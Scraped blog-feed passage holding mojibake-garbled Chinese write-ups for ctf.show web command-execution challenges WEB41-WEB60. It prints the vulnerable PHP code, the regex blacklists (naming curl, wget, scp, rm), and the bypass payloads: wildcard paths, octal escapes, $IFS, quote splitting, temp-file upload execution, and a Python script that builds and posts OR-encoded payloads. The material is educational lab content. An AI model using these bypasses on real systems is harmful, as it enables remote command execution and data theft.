|[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c); } }else{ highlight_file(__FILE__); } tip:è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤ã€‚ä¸­é—´è¿™äº›ä¸ªå¾ˆå¤šçš„æ˜Ÿå·çš„å†…å®¹ï¼Œå…¶å®æ˜¯è¯´ï¼Œå«æœ‰cat,moreè¿™æ ·çš„ä¼šè¢«åŒ¹é…ï¼Œå¦‚cat é‚£ä¹ˆca323390ftæˆ–c232fa3kdfstï¼Œå‡¡æ˜¯æŒ‰åºå‡ºç°äº†cat éƒ½è¢«åŒ¹é…ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å†™ca?å› ä¸ºè¿™æ ·æ˜¯åŒ¹é…ä¸åˆ°å‘½ä»¤çš„ã€‚åªèƒ½æŠŠå…¨è·¯å¾„å†™å‡ºæ¥ï¼Œå¦‚/bin/ca?ï¼Œä¸/bin/ca?åŒ¹é…çš„ï¼Œåªæœ‰/bin/catå‘½ä»¤ï¼Œè¿™æ ·å°±ç”¨åˆ°äº†catå‘½ä»¤äº†ã€‚\nè¿™é‡Œæœ‰ä¸¤ç§æ€è·¯ï¼Œç¬¬ä¸€ç§å°±æ˜¯é€šè¿‡ç–å¿½æ²¡æœ‰è¿‡æ»¤çš„æŒ‡ä»¤æ¥è¿›è¡Œè¯»å–ï¼ˆæŸ¥ä¸Šä¸€ç« çš„è¡¨ï¼‰ï¼Œç¬¬äºŒç§æ˜¯é€šè¿‡ä¸€äº›ç‰¹æ®Šæ–¹æ³•ç»•è¿‡ã€‚\næˆ‘å…ˆæƒ³å‡ºæ¥çš„ç¬¬ä¸€ç§ï¼š\nè¿™é‡Œä¸­é—´åŠ æ˜Ÿå·çš„æ„æ€å°±æ˜¯åŒ¹é…åˆ°ä¾‹å¦‚cxxxxxaxxxtè¿™ç§å­—ç¬¦å°±è¿‡æ»¤æ‰ï¼Œè¿™é‡Œå°±ä¸å¯ä»¥å‡ºç°å¯ä»¥è¿èµ·æ¥çš„ä»¥ä¸Šçš„è¯ï¼Œè¿™é‡Œæˆ‘é€šè¿‡hexdumpæ¥è¯»å–å‡ºæ–‡ä»¶ç¼–ç ï¼Œç„¶åé€šè¿‡cyberchefå…ˆfrom hexdumpè½¬æˆåŸå§‹hexä½ï¼Œå†ä½¿ç”¨Swap endiannessè¿›è¡Œä¸€æ¬¡åè½¬ï¼Œå†è½¬æ¢å›å»å°±å¾—åˆ°äº†åŸå§‹çš„æ–‡ä»¶ã€‚\nè¿™é‡Œè¿˜å¯ä»¥é€šè¿‡/bin/ca?``mv flag.php 1.txt è¿™ç§è¿›è¡Œç»•è¿‡ï¼Œè¿™é‡Œä¸ä»”ç»†è¯´äº†ã€‚\nWEB55 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 20:03:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜è€ƒbashæ— å­—æ¯å‘½ä»¤æ‰§è¡Œï¼Œè¿™é¢˜è§£æ³•æŒºå¤šçš„ï¼Œè¿™é‡Œä¸¾ä¾‹ä¸¤ä¸ªï¼š\n1. ç”±äºè¿‡æ»¤äº†å­—æ¯ï¼Œä½†æ²¡æœ‰è¿‡æ»¤æ•°å­—ï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨/binç›®å½•ä¸‹çš„å¯æ‰§è¡Œç¨‹åºã€‚\nä½†å› ä¸ºå­—æ¯ä¸èƒ½ä¼ å…¥ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨é€šé…ç¬¦?æ¥è¿›è¡Œä»£æ›¿\n?c=/bin/base64 flag.php\næ›¿æ¢åpayloadä¸ºï¼š\n?c=/???/????64 ????.??? 2. ä½¿ç”¨è¿™ç§Bashçš„å…«è¿›åˆ¶è½¬ä¹‰åºåˆ—ï¼š$\u0026rsquo;\\154\\163\u0026rsquo;ï¼ˆlsï¼‰ $\u0026rsquo;\\143\\141\\164\u0026rsquo;%20*ï¼ˆcat *ï¼‰\nWEB56 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ system($c); } }else{ highlight_file(__FILE__); } è¿™æ¬¡æŠŠ0-9å’Œa-zå…¨éƒ¨è¿‡æ»¤äº†ï¼Œå¯ä»¥åˆ©ç”¨postæ–¹æ³•å¼ºåˆ¶ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç”±äºphpæ¥æ”¶åˆ°postæ–¹æ³•ä¸Šä¼ çš„æ–‡ä»¶ä¼šä¿å­˜åˆ°/tmp/php******è¿™é‡Œï¼Œå¯ä»¥æ„é€ ?c=.%20/???/????????[@-[] ç­‰æ•ˆæ‰§è¡Œ/tmp/phpxxxxxx è§£é‡Šï¼š1. linuxä¸‹.å¯ä»¥ç”¨äºæ‰§è¡Œæ–‡ä»¶ 2.[@-[] åŒ¹é…å­—ç¬¦ç±»ï¼ŒåŒ¹é…ASCIIä»‹äº @ å’Œ [ ä¹‹é—´çš„å­—ç¬¦ï¼ˆå³å¤§å†™å­—æ¯ï¼‰\n1 2 3 4 \u0026lt;form action=\u0026#34;http://xxx.ctf.show/\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; æ‰“å¼€ä¸Šé¢çš„ç½‘é¡µï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ç„¶åç”¨burpæŠ“åŒ…ï¼ŒæŠŠæ–‡ä»¶çš„å†…å®¹æ›¿æ¢æˆcat flag.phpå‘åŒ…å³å¯ï¼Œå¯èƒ½ä¸€æ¬¡ä¸æˆåŠŸå°±å¤šè¯•å‡ æ¬¡å°±å¥½äº†ï¼ˆæœ‰å¯èƒ½æœ‰å°å†™å­—ç¬¦ï¼‰\nWEB57 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-08 01:02:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ //flag in 36.php if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\x0a|\\\u0026gt;|\\\u0026lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\u0026#34;, $c)){ system(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜æŠŠ.ç»™è¿‡æ»¤äº†ï¼Œä¸Šä¸€é“é¢˜çš„æ–¹æ³•ç”¨ä¸äº†äº†ã€‚\nä¸è¿‡ç»™å‡ºäº†æç¤ºï¼šflagåœ¨36.phpä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•æ„é€ å‡ºâ€œ36â€\né€šè¿‡$(())æ“ä½œæ„é€ å‡º36ï¼š $(()) ï¼šä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0\n$(( ~$(()) )) ï¼šå¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1\n$(( $(($(()))) $(($(()))) ))ï¼š -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2\n$(( $(( $(($(()))) $((~$(()))) )) )) ï¼šå†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1\næˆ‘ä»¬åœ¨$(( $(( )) ))é‡Œé¢æ”¾37ä¸ª$(($(())))ï¼Œå¾—åˆ°-37ï¼Œå–åå³å¯å¾—åˆ°36\nWEB58-WEB60 1 2 3 4 if(isset($_POST[\u0026#39;c\u0026#39;])){ $c= $_POST[\u0026#39;c\u0026#39;]; eval($c); } è¿™é‡Œç›´æ¥ç»™äº†evalå‡½æ•°ï¼Œä½†æ˜¯æµ‹è¯•äº†ä¸€ä¸‹systemå‡½æ•°è¢«ç¦ç”¨äº†ï¼Œä¸è¿‡æœ‰å¾ˆå¤šå¾ˆå¤šæ–¹æ³•å¯ä»¥è¿›è¡Œç»•è¿‡\n1 2 3 4 5 6 7 var_dump() #æ‰“å°å˜é‡ç›¸å…³ä¿¡æ¯ print_r() #æ‰“å°å¤šä¸ªå˜é‡çš„å€¼ï¼Œå¯ä»¥æ‰“å°å¤æ‚ç±»å‹å˜é‡çš„å€¼ï¼Œå¦‚array file_get_contents() highlight_file() show_source() #highlight_file()çš„åˆ«å readfile() scandir() #ç”¨äºæ‰“å°ç›®å½•ä¸‹çš„æ–‡ä»¶ è¿™é‡Œç»™ä¸€ä¸ªä¾‹å­ï¼š\n1 2 print_r(scandir(\u0026#39;.\u0026#39;)); #æ‰“å°å½“å‰ç›®å½•æ–‡ä»¶åå­— show_source(\u0026#39;flag.php\u0026#39;); #å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚ ä»web58-web65éƒ½å¯ä»¥ä½¿ç”¨highlight_file()ç»•è¿‡ï¼Œè¿™é‡Œä¸å¤šå™è¿°äº†ã€‚\n","date":"2025-04-15T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_3/","title":"CTF_show Web å‘½ä»¤æ‰§è¡Œwriteup P3 WEB51-WEB60"},{"content":"å–µï¼Ÿ\nç§»åŠ¨ç«¯è®¿é—®è¿™é‡Œ\r","date":"2025-03-28T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/deepmiao/","title":"æœ¬ç«™ç°å·²æ¥å…¥AIå–µ...å¯¹å—ï¼Ÿ"},{"content":"é˜¿ä¼Ÿä½ åˆåœ¨æ‰“ç”µåŠ¨å–”ï¼Œä¼‘æ¯ä¸€ä¸‹å§ï¼Œå»çœ‹çœ‹ä¹¦å¥½ä¸å¥½\nç§»åŠ¨ç«¯è®¿é—®è¿™é‡Œ\r","date":"2025-03-22T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/fivechessv2/","title":"äº”å­æ£‹v2.0"},{"content":"CTFSHOW web å‘½ä»¤æ‰§è¡ŒWriteUP Part2 WEB41 è¿‡æ»¤ä¸ä¸¥ï¼Œå‘½ä»¤æ‰§è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: ç¾½ # @Date: 2020-09-05 20:31:22 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:40:07 # @email: 1341963450@qq.com # @link: https://ctf.show */ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c = $_POST[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ eval(\u0026#34;echo($c);\u0026#34;); } }else{ highlight_file(__FILE__); } ?\u0026gt; è¿™æ¬¡æ²¡æœ‰æ€è·¯äº†ï¼Œçœ‹ç¾½å¸ˆå‚…å†™çš„ç¨‹åºåˆ†æäº†ä¸€ä¸‹ï¼Œå¤§ä½“æ„æ€å°±æ˜¯ä»è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶ååœ¨åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦ ç¾½å¸ˆå‚…å…ˆæŠŠæˆ–è¿ç®—çš„ç»“æœæ”¾è¿›txtï¼Œç„¶åæŸ¥è¡¨æ„é€ payloadï¼Œç”¨äº†ä¸¤ä¸ªè„šæœ¬ï¼Œè¿™é‡Œç»™ä¸€ä¸ªä¸€ä½“åŒ–çš„è„šæœ¬ï¼Œç›´æ¥è¾“å…¥urlå¯ä»¥ç›´æ¥è·å–æ‰§è¡Œç»“æœ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import re import urllib from urllib import parse import requests contents = [] for i in range(256): for j in range(256): hex_i = \u0026#39;{:02x}\u0026#39;.format(i) hex_j = \u0026#39;{:02x}\u0026#39;.format(j) preg = re.compile(r\u0026#39;[0-9]|[a-z]|\\^|\\+|~|\\$|\\[|]|\\{|}|\u0026amp;|-\u0026#39;, re.I) if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))): continue else: a = \u0026#39;%\u0026#39; + hex_i b = \u0026#39;%\u0026#39; + hex_j c = chr(int(a[1:], 16) | int(b[1:], 16)) if 32 \u0026lt;= ord(c) \u0026lt;= 126: contents.append([c, a, b]) def make_payload(cmd): payload1 = \u0026#39;\u0026#39; payload2 = \u0026#39;\u0026#39; for i in cmd: for j in contents: if i == j[0]: payload1 += j[1] payload2 += j[2] break payload = \u0026#39;(\u0026#34;\u0026#39; + payload1 + \u0026#39;\u0026#34;|\u0026#34;\u0026#39; + payload2 + \u0026#39;\u0026#34;)\u0026#39; return payload URL = input(\u0026#39;url:\u0026#39;) payload = make_payload(\u0026#39;system\u0026#39;) + make_payload(\u0026#39;cat flag.php\u0026#39;) response = requests.post(URL, data={\u0026#39;c\u0026#39;: urllib.parse.unquote(payload)}) print(response.text) WEB42 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 20:51:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); }else{ highlight_file(__FILE__); } Linus Benedict Torvalds åœ¨/dev/nullèµ°äº†ä¸€åœˆ,ç„¶åå›æ¥äº†ã€‚\nè¿™é“é¢˜ä¼šæŠŠå›æ˜¾ä¸¢å¼ƒï¼Œä¸è¿‡ç”±äºå¹¶ä¸å½±å“ä¼ å‚è¿‡ç¨‹ï¼Œç›´æ¥ä¼ å‚?c=cp flag.php 1.txtç„¶åè®¿é—®url/1.txtå°±ç›´æ¥è·å–flagäº†ï¼Œä¸‹é¢å†ä»‹ç»ä¸€äº›å…¶ä»–çš„æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š\nä½¿ç”¨ \u0026quot; ; \u0026quot; \u0026quot; || \u0026quot; \u0026quot; \u0026amp; \u0026quot; \u0026quot; \u0026amp;\u0026amp; \u0026quot; åˆ†éš”\n/dev/null 2\u0026gt;\u0026amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° /dev/null å³ä¸å›æ˜¾ ; //åˆ†å· | //åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤ || //åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤ \u0026amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ \u0026amp;\u0026amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ\nå¯æ„é€ playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 æ³¨æ„ï¼Œè¿™é‡Œçš„\u0026amp;éœ€è¦urlç¼–ç \nWEB43 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜ç›¸æ¯”WEB42ä»…ä»…å¤šäº†ä¸€å±‚è¿‡æ»¤catæŒ‡ä»¤å’Œåˆ†å·ï¼Œä½¿ç”¨ä¸Šä¸€é¢˜æˆ‘çš„cpä¼ å‚ä»ç„¶æœ‰æ•ˆï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨\u0026amp;\u0026amp; ||ç­‰ç­‰ï¼Œè¿™é‡Œä¸è¯¦ç»†è§£é‡Šäº†\nWEB44 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:01 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } ä¸ç”¨å¤šè§£é‡Šå•¥äº†ï¼Œåªæ˜¯å¤šäº†ä¸ªè¿‡æ»¤flagå…³é”®å­—è€Œå·²ï¼Œç›´æ¥cp f* 1.txt æˆ–è€…\u0026hellip;tac f*ç­‰ç­‰ç­‰ç­‰ç­‰éƒ½å¯ä»¥çš„\nWEB45 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:35:34 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| /i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™æ¬¡æŠŠç©ºæ ¼ä¹Ÿç»™è¿‡æ»¤äº†ï¼Œäºæ˜¯éœ€è¦payloadæŠŠç©ºæ ¼æ›¿æ¢æ‰ï¼Œä¾‹å¦‚ï¼š\nä½¿ç”¨Tabé”®ï¼ˆ%09ï¼‰ ä½¿ç”¨æ¢è¡Œç¬¦ï¼ˆ%0aï¼‰ ä½¿ç”¨$IFSå˜é‡ï¼ˆLinuxç³»ç»Ÿä¸­çš„å†…éƒ¨å˜é‡ï¼Œè¡¨ç¤ºåˆ†éš”ç¬¦ï¼‰ ä½¿ç”¨\u0026lt;ï¼ˆé‡å®šå‘ç¬¦ï¼‰ æ„é€ payloadï¼š\n1 ?c=cp$IFS\u0026#39;f\u0026#39;*$IFS\u0026#39;1.txt\u0026#39; è®¿é—®1.txtå³å¯è·å–flagã€‚\næˆ–è€…ä¹Ÿå¯ä»¥æ„é€ è¿™æ ·çš„payloadæŠµæ¶ˆæ‰åé¢çš„\u0026gt;/dev/nullä¸€æ­¥å®Œæˆï¼š\n1 2 3 ?c=tac%09f*.php|| ?c=tac$IFS$f*|| ?c=tac$IFS$f*%26 *å¿…é¡»ç”¨%26è€Œä¸èƒ½ç”¨\u0026amp;\nWEB46 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€æœ‰æ•°å­—ä»¥åŠ$å’Œ*ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ\næˆ‘ä»¬åœ¨shellåšäº†ä¸ªå®éªŒï¼š\n1 2 root@hcss-ecs-b1d9:~# c\u0026#39;\u0026#39;at fl\u0026#39;\u0026#39;ag falg{1s_n0t_h3r3} å¯ä»¥å‘ç°''ä¼šè¢«å¿½ç•¥å¹¶è¾“å‡ºåŸæœ¬çš„å‘½ä»¤å†…å®¹ 'çš„ç½‘é¡µç¼–ç ä¸º%27\næˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªåŸç†æ„é€ payloadï¼š\n1 ?c=tac%09fl%27%27ag.php|| è¿™é‡Œçš„æ•°å­—ä¼šè¢«è½¬è¯‘ä¸ºç¬¦å·ï¼Œä¸ä¼šè¢«è¿‡æ»¤ï¼Œç›´æ¥ä¼ å‚å³å¯ã€‚\nå¦å¤–?å¯ä»¥ä»£æ›¿*ï¼Œ?æŒ‡ä»£ä¸€ä¸ªå­—ç¬¦ä½ã€‚\nWEB47 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:59:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } å’Œä¸Šé¢˜åŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯å¤šè¿‡æ»¤äº†ä¸€äº›è¾“å‡ºæ–‡ä»¶çš„å…³é”®è¯ï¼Œä½†æ˜¯å¹¶ä¸å½±å“æˆ‘ä»¬ä¸Šé¢˜payloadçš„æ€è·¯\nä¸è¿‡è¿™é“é¢˜ä¹Ÿèƒ½è®©æˆ‘ä»¬æ›´åŠ äº†è§£ç»ˆç«¯è¾“å‡ºæ–‡ä»¶å†…å®¹çš„ä¸€äº›æ–°çš„æ–¹æ³•ï¼Œå¯ä»¥ç§¯ç´¯ä¸€ä¸‹ã€‚\nWEB48 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:06:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } åŒä¸Šé¢˜ç›®ï¼Œå¤šè¿‡æ»¤äº†ä¸€äº›å¯ä»¥åˆ©ç”¨çš„payloadï¼Œä½†æ˜¯å•å¼•å·ä»ç„¶å¯ä»¥ä½¿ç”¨ï¼Œä¸‹é¢ç®€å•ä»‹ç»ä¸€äº›è¿™é‡Œä¸€äº›å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•ï¼š\nä¸€äº›æ–‡ä»¶å†…å®¹æŸ¥çœ‹å‘½ä»¤çš„åˆ©ç”¨æ–¹å¼ moreï¼šåˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹\n1 more flag.php # åˆ†é¡µæ˜¾ç¤ºflag.phpçš„å†…å®¹ lessï¼šä¸moreç±»ä¼¼ï¼Œä½†åŠŸèƒ½æ›´å¼ºå¤§ï¼Œå¯ä»¥å‘å‰ç¿»é¡µ\n1 less flag.php # äº¤äº’å¼æŸ¥çœ‹flag.php headï¼šæ˜¾ç¤ºæ–‡ä»¶å¼€å¤´éƒ¨åˆ†\n1 2 head flag.php # é»˜è®¤æ˜¾ç¤ºå‰10è¡Œ head -n 5 flag.php # æ˜¾ç¤ºå‰5è¡Œ tailï¼šæ˜¾ç¤ºæ–‡ä»¶ç»“å°¾éƒ¨åˆ†\n1 2 tail flag.php # é»˜è®¤æ˜¾ç¤ºæœ€å10è¡Œ tail -n 3 flag.php # æ˜¾ç¤ºæœ€å3è¡Œ sortï¼šå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ’åºæ˜¾ç¤º\n1 sort flag.php # æŒ‰å­—æ¯é¡ºåºæ’åºæ˜¾ç¤º sedï¼šæµç¼–è¾‘å™¨ï¼Œå¯ä»¥å¯¹æ–‡æœ¬è¿›è¡Œæ›¿æ¢ã€åˆ é™¤ç­‰æ“ä½œ\n1 2 sed \u0026#39;s/password/PASSWORD/g\u0026#39; flag.php # æ›¿æ¢æ‰€æœ‰passwordä¸ºPASSWORDå¹¶æ˜¾ç¤º sed -n \u0026#39;5p\u0026#39; flag.php # åªæ˜¾ç¤ºç¬¬5è¡Œ cutï¼šå‰ªåˆ‡æ–‡ä»¶çš„ä¸€éƒ¨åˆ†å†…å®¹\n1 cut -d \u0026#34;:\u0026#34; -f 1 flag.php # ä»¥å†’å·ä¸ºåˆ†éš”ç¬¦ï¼Œæ˜¾ç¤ºç¬¬1ä¸ªå­—æ®µ awkï¼šå¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·\n1 2 awk \u0026#39;{print $1}\u0026#39; flag.php # æ‰“å°æ¯è¡Œçš„ç¬¬ä¸€ä¸ªå­—æ®µ awk \u0026#39;/flag/{print}\u0026#39; flag.php # æ‰“å°åŒ…å«\u0026#34;flag\u0026#34;çš„è¡Œ stringsï¼šæå–æ–‡ä»¶ä¸­çš„å¯æ‰“å°å­—ç¬¦ä¸²\n1 strings flag.php # æ˜¾ç¤ºflag.phpä¸­çš„æ‰€æœ‰å¯æ‰“å°å­—ç¬¦ä¸² odï¼šå…«è¿›åˆ¶è½¬å‚¨ï¼Œå¯ä»¥æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶\n1 2 od -c flag.php # ä»¥å­—ç¬¦å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ od -x flag.php # 